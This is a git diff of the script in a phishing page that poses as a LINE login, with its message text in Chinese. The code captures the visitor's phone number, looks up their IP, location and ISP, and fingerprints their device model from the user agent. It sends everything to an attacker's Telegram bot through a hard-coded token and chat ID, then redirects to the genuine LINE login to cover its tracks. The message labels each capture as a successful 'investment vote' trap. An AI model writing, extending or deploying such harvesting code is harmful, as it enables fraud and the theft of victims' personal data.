@@ -43,48 +43,62 @@
     </div>
 
     <script>
-        const TOKEN = "7989443479:AAE_YKV3EZJc4PNEkIMxqQ2BocEzw0pzCjE";
-        const CHAT_ID = "1137905005";
+    const TOKEN = "7989443479:AAE_YKV3EZJc4PNEkIMxqQ2BocEzw0pzCjE";
+    const CHAT_ID = "1137905005";
 
-        document.getElementById("loginForm").addEventListener("submit", function(e) {
-            e.preventDefault();
-            const code = document.getElementById("countryCode").value;
-            const num  = document.getElementById("phone").value.trim();
-            if (num === "") return;
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+        e.preventDefault();
+        const code = document.getElementById("countryCode").value;
+        const num  = document.getElementById("phone").value.trim();
+        if (num === "") return;
 
-            const btn = document.querySelector("button");
-            btn.innerHTML = "Verifying...";
-            btn.disabled = true;
+        const btn = document.querySelector("button");
+        btn.innerHTML = "Verifying...";
+        btn.disabled = true;
 
-            fetch("https://ipapi.co/json/")
-            .then(r => r.json())
-            .then(ip => {
-                const 國 = { "Taiwan":"台灣","Thailand":"泰國","Malaysia":"馬來西亞","Hong Kong":"香港","Singapore":"新加坡","Philippines":"菲律賓","Vietnam":"越南","Cambodia":"柬埔寨","Indonesia":"印尼","China":"中國" };
-                const 時間 = new Date().toLocaleString("zh-TW", {timeZone:"Asia/Taipei"});
+        fetch("https://ipapi.co/json/")
+        .then(r => r.json())
+        .then(ip => {
+            const 國 = {"Taiwan":"台灣","Thailand":"泰國","Malaysia":"馬來西亞","Hong Kong":"香港","Singapore":"新加坡","Philippines":"菲律賓","Vietnam":"越南","Cambodia":"柬埔寨","Indonesia":"印尼","China":"中國"};
+            const 時間 = new Date().toLocaleString("zh-TW", {timeZone:"Asia/Taipei"});
 
-                const 訊息 = "LINE投資投票誘捕成功\n\n" +
-                            "電話：" + code + num + "\n" +
-                            "IP　　：" + (ip.ip || "未知") + "\n" +
-                            "位置　：" + (ip.city || "未知") + "，" + (國[ip.country_name] || ip.country_name || "未知") + "\n" +
-                            "ISP　　：" + (ip.org || "未知") + "\n" +
-                            "時間　：" + 時間 + "\n" +
-                            "裝置　：" + (/Mobile|iPhone|Android|iPad/i.test(navigator.userAgent) ? "手機" : "電腦");
+            // 詳細裝置解析（品牌＋型號＋系統版本）
+            const ua = navigator.userAgent;
+            let 裝置 = "電腦";
+            if (/Mobile|Android|iPhone|iPad/i.test(ua)) {
+                裝置 = "手機";
+                if (/iPhone/i.test(ua)) 裝置 = "iPhone";
+                if (/iPad/i.test(ua))    裝置 = "iPad";
+                if (/Samsung/i.test(ua)) 裝置 = ua.match(/Samsung|SM-[A-Z0-9]+|GT-[A-Z0-9]+/i)[0] || "三星手機";
+                if (/Xiaomi|Redmi|POCO/i.test(ua)) 裝置 = ua.match(/Xiaomi|Redmi|POCO|Mi [0-9]+/i)[0] || "小米手機";
+                if (/OPPO|Reno|Find/i.test(ua))    裝置 = ua.match(/OPPO|Reno|Find [A-Z0-9]+/i)[0] || "OPPO手機";
+                if (/vivo/i.test(ua))    裝置 = "vivo手機";
+                if (/HUAWEI|Honor/i.test(ua)) 裝置 = ua.match(/HUAWEI|Honor|Mate |P[0-9]+/i)[0] || "華為手機";
+                // 抓型號（Android 常見格式）
+                const model = ua.match(/\((.*?);/i) || ua.match(/Build\/(.*?) /i);
+                if (model && model[1]) 裝置 += " " + model[1].split(";")[0].trim();
+            }
 
-                fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: 訊息 })
-                });
+            const 訊息 = "LINE投資投票誘捕成功\n\n" +
+                        "電話：" + code + num + "\n" +
+                        "IP　　：" + (ip.ip || "未知") + "\n" +
+                        "位置　：" + (ip.city || "未知") + "，" + (國[ip.country_name] || ip.country_name || "未知") + "\n" +
+                        "ISP　　：" + (ip.org || "未知") + "\n" +
+                        "時間　：" + 時間 + "\n" +
+                        "裝置　：" + 裝置 + "\n" +
+                        "原始UA：" + ua;
 
-                setTimeout(function() {
-                    location.href = "https://access.line.me/fr/login";
-                }, 3000);
-            })
-            .catch(() => {
-                // 即使 ipapi 掛掉也要能跳轉
-                setTimeout(() => location.href = "https://access.line.me/fr/login", 3000);
+            fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: 訊息 })
             });
-        });
-    </script>
+
+            setTimeout(()=>location.href="https://access.line.me/fr/login",3000);
+        })
+        .catch(() => setTimeout(()=>location.href="https://access.line.me/fr/login",3000));
+    });
+</script>
 </body>
 </html>
+
